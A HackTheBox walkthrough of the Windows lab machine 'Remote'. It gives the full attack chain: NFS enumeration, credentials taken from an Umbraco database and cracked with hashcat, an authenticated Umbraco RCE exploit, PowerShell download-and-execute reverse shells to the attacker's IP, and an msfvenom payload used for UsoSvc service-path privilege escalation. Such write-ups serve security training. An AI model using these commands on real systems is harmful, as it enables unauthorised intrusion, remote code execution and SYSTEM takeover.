---
title: HackTheBox - Remote
date: 2021-08-15 20:35:44 +0100
categories: [Hackthebox walkthroughs, Windows, Easy]
tags: [NFS, Umbraco, hashcat, password cracking, searchsploit, nishang, powershell, IWR, SERVICE_ALL_ACCESS, BINARY_PATH_NAME, sc.exe, exploiting Windows service, htb-windows-easy, writeup, oscp-prep]
image: /assets/img/htb/machines/windows/easy/remote/Remote.jpeg
---

## Enumeration

### `nmap` scan

```bash
# Nmap 7.91 scan initiated Sun Aug 15 17:43:17 2021 as: nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Remote-full-port-scan.txt 10.10.10.180
Warning: 10.10.10.180 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.180
Host is up (0.098s latency).
Not shown: 61692 closed ports, 3827 filtered ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Port 21 (FTP)

Anonymous FTP login is allowed, however it seems there are no files here:

```bash
$ ftp $TARGET
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

### Port 2049 (NFS)

There is an available share that we can mount on our local machine by doing so:

```bash
$ showmount -e 10.10.10.180 | tee services/2049-NFS.txt
Export list for 10.10.10.180:
/site_backups (everyone)
$ mount -t nfs $TARGET:site_backups /mnt/tmp/ -nolock
$ ls /mnt/tmp
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
```

It looks like these files are a backup for a website.

Looking for config files in order to find sensitive information such as passwords, we can take a look at `Umbraco.sdf` (in the `App_Data` folder) which is the **Umbraco** Database for connection credentials.

```bash
$ strings Umbraco.sdf | grep password
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
passwordConfig
```

Apparently, there are two users at least: `admin` and `ssmith`. Let's investigate more:

```bash
$ root@kali:/mnt/tmp/App_Data# strings Umbraco.sdf | grep "admin@htb.local"                                                                                                                   
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50                                                
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f                                                
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
```

BINGO! We got a SHA-1 hash: `b8be16afba8c314ad33d812f22a04991b90e2aaa`.

Let's try to crack it using `hashcat`:

```bash
$ cat > hash.txt
b8be16afba8c314ad33d812f22a04991b90e2aaa
^C
$ hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
...
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
...
```

Okay so `admin@htb.local`'s password should be `baconandcheese`.

### Port 80 (Microsoft HTTPAPI httpd 2.0)

![](/assets/img/htb/machines/windows/easy/remote/80.png)

#### `dirb`

```
$ dirb http://$TARGET -o services/80-dirb.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: services/80-dirb.txt
START_TIME: Sun Aug 15 17:45:50 2021
URL_BASE: http://10.10.10.180/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.180/ ----
+ http://10.10.10.180/about-us (CODE:200|SIZE:5441)                                                                                                         
+ http://10.10.10.180/blog (CODE:200|SIZE:5011)                                                                                                             
+ http://10.10.10.180/Blog (CODE:200|SIZE:5011)                                                                                                             
+ http://10.10.10.180/contact (CODE:200|SIZE:7890)                                                                                                          
+ http://10.10.10.180/Contact (CODE:200|SIZE:7890)                                                                                                          
+ http://10.10.10.180/home (CODE:200|SIZE:6703)                                                                                                             
+ http://10.10.10.180/Home (CODE:200|SIZE:6703)                                                                                                             
+ http://10.10.10.180/install (CODE:302|SIZE:126)                                                                                                           
+ http://10.10.10.180/intranet (CODE:200|SIZE:3323)                                                                                                         
+ http://10.10.10.180/master (CODE:500|SIZE:3420)                                                                                                           
+ http://10.10.10.180/people (CODE:200|SIZE:6739)                                                                                                           
+ http://10.10.10.180/People (CODE:200|SIZE:6739)                                                                                                           
+ http://10.10.10.180/person (CODE:200|SIZE:2741)                                                                                                           
+ http://10.10.10.180/product (CODE:500|SIZE:3420)                                                                                                          
+ http://10.10.10.180/products (CODE:200|SIZE:5328)                                                                                                         
+ http://10.10.10.180/Products (CODE:200|SIZE:5328)                                                                                                         
+ http://10.10.10.180/umbraco (CODE:200|SIZE:4040)                                                                                                          
                                                                                                                                                            
-----------------
END_TIME: Sun Aug 15 17:57:49 2021
DOWNLOADED: 4612 - FOUND: 17
```

#### `nikto`

```
$ nikto -h 10.10.10.180 -output services/80-nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.180
+ Target Hostname:    10.10.10.180
+ Target Port:        80
+ Start Time:         2021-08-15 17:42:34 (GMT2)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server banner has changed from '' to 'Microsoft-IIS/10.0' which may suggest a WAF, load balancer or proxy is in place
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /home/: This might be interesting...
+ OSVDB-3092: /intranet/: This might be interesting...
+ /umbraco/ping.aspx: Umbraco ping page found
+ 7869 requests: 6 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-08-15 18:03:13 (GMT2) (1239 seconds)
---------------------------------------------------------------------------
```

___

## Foothold

### Umbraco

![](/assets/img/htb/machines/windows/easy/remote/umbraco.png)

Using the credentials we found earlier, we can log in:

![](/assets/img/htb/machines/windows/easy/remote/logged_in.png)

Looking at `searchsploit` we can see there are some exploits available that require authentication:

![](/assets/img/htb/machines/windows/easy/remote/searchsploit.png)

```bash
$ searchsploit -m aspx/webapps/49488.py
$ python 49488.py -u admin@htb.local -p baconandcheese -i "http://$TARGET" -c whoami
iis apppool\defaultapppool
```

Okay, it looks like we can exploit a remote code execution vulnerability in Umbraco.

___

## Exploitation

We will be using **nishang**'s `Invoke-PowerShellTcp.ps1` script.

```bash
$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
$ echo "" >> shell.ps1
$ echo "Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 1234" >> shell.ps1
```

Don't forget run a web server and a listener:

```bash
# On one terminal
$ python3 -m http.server 80
# On another
$ nc -lnvp 1234
```

```bash
$ python 49488.py -u admin@htb.local -p baconandcheese -i "http://$TARGET" -c "powershell.exe" -a "iex(new-object net.webclient).downloadstring('http://10.10.14.12/shell.ps1')" 2>/dev/null
```

<!-- ```bash
$ python 49488.py -u admin@htb.local -p baconandcheese -i "http://$TARGET" -c "powershell" -a "iex(IWR http://10.10.14.12/shell.ps1 -UseBasicParsing)" 2>/dev/null
``` -->

![](/assets/img/htb/machines/windows/easy/remote/shell.png)

```powershell
PS C:\Users\Public> type user.txt
af34ddf7875def2cff889b7710163693
```

___

## Privesc

```powershell
PS C:\windows\system32\inetsrv>systeminfo

Host Name:                 REMOTE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-00521-62775-AA801
Original Install Date:     2/19/2020, 4:03:29 PM
System Boot Time:          8/15/2021, 11:39:54 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              4 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [03]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [04]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,790 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,603 MB
Virtual Memory: In Use:    1,196 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB4534119
                           [02]: KB4462930
                           [03]: KB4516115
                           [04]: KB4523204
                           [05]: KB4464455
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.180
                                 [02]: fe80::8959:5ee9:7065:8f1c
                                 [03]: dead:beef::8959:5ee9:7065:8f1c
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
PS C:\windows\system32\inetsrv> (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/winPEASx64.exe', 'c:\Windows\System32\spool\drivers\color\winPEASx64.exe')
PS C:\windows\system32\inetsrv> cd c:\Windows\System32\spool\drivers\color\
PS C:\Windows\System32\spool\drivers\color> .\winPEASx64.exe
```

`winPEAS` revealed that we have all access to the service `UsoSvc`:

![](/assets/img/htb/machines/windows/easy/remote/winPEAS.png)

Let's get the current status and config of the service:

```powershell
PS C:\Windows\System32\spool\drivers\color> sc.exe query UsoSvc

SERVICE_NAME: UsoSvc 
        TYPE               : 30  WIN32  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
PS C:\Windows\System32\spool\drivers\color> sc.exe qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem
```

Okay, maybe we can stop the service and try to change its `BINARY_PATH_NAME` by a malicious file.

- We can generate a malicious executable with `msfvenom` and start a listener:

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(vpnip) LPORT=53 -f exe -o privesc.exe                                                            
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: privesc.exe
$ nc -lnvp 53
listening on [any] 53 ...
```

- Then we have to upload it:

```powershell
PS C:\Windows\System32\spool\drivers\color> (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/privesc.exe', 'c:\Windows\System32\spool\drivers\color\privesc.exe')
```

- Finally, stop the service, change the binary path and restart the service:

```powershell
PS C:\Windows\System32\spool\drivers\color> net stop UsoSvc
The Update Orchestrator Service service is stopping.
The Update Orchestrator Service service was stopped successfully.

# We could also do: sc.exe config UsoSvc binpath= "powershell.exe 'IWR http://10.10.14.12/shell.ps1 -UseBasicParsing'"
PS C:\Windows\System32\spool\drivers\color> sc.exe config UsoSvc binpath= "C:\Windows\System32\spool\drivers\color\privesc.exe"
[SC] ChangeServiceConfig SUCCESS
PS C:\Windows\System32\spool\drivers\color> net start UsoSvc 
```

![](/assets/img/htb/machines/windows/easy/remote/system.png)

___

## Useful links

- <https://github.com/antonioCoco/RoguePotato>
- [My cheat sheat about Windows Privesc](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#privesc)